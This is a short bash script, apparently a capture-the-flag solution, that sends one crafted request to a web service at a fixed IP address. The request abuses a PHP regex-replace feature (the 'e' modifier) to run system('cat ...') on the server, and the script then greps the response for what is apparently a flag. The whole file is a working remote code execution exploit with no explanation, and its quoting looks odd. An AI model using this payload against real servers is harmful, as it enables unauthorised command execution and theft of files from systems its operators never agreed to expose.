#!/bin/bash

URL='http://141.85.224.105:8001

curl "$URL"'/?needle=m%2Fe&replacement=system%28%27cat+wRtu3ND38n8RNgez%27%29&haystack=m&submit=Replace' -s | grep SSS | xargs
